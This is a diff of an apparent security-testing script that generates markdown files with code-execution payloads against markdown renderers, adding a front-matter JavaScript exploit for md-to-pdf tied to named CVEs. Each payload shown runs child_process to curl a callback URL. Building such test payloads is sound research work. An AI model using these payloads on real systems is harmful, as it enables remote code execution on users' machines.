@@ -42,7 +42,7 @@ require('child_process').exec('curl ''' + base_url + '''/rce1-electron');
     with open(rce_dir / "rce3_marktext_dom.md", 'w', encoding='utf-8') as f:
         f.write(md_rce3_marktext_dom)
     
-    md_rce4_md_to_pdf = '''# Test
+    md_rce4_md_to_pdf = '''# Test - md-to-pdf code block RCE (CVE-2021-23639)
 
 ```javascript
 require('child_process').exec('curl ''' + base_url + '''/rce4-md-to-pdf');
@@ -81,6 +81,14 @@ eval: require('child_process').exec('curl ''' + base_url + '''/rce7-frontmatter'
 '''
     with open(rce_dir / "rce7_frontmatter_js.md", 'w', encoding='utf-8') as f:
         f.write(md_rce7_frontmatter_js)
+    
+    # New CVE payload - md-to-pdf front-matter JavaScript RCE (CVE-2025-65108)
+    md_rce_md_to_pdf_cve = '''---javascript
+((require("child_process")).execSync("curl ''' + base_url + '''/rce-md-to-pdf-cve"))
+---RCE
+'''
+    with open(rce_dir / "rce_md_to_pdf_cve.md", 'w', encoding='utf-8') as f:
+        f.write(md_rce_md_to_pdf_cve)
     
     md_ssrf1_image_link = '''# Test
 
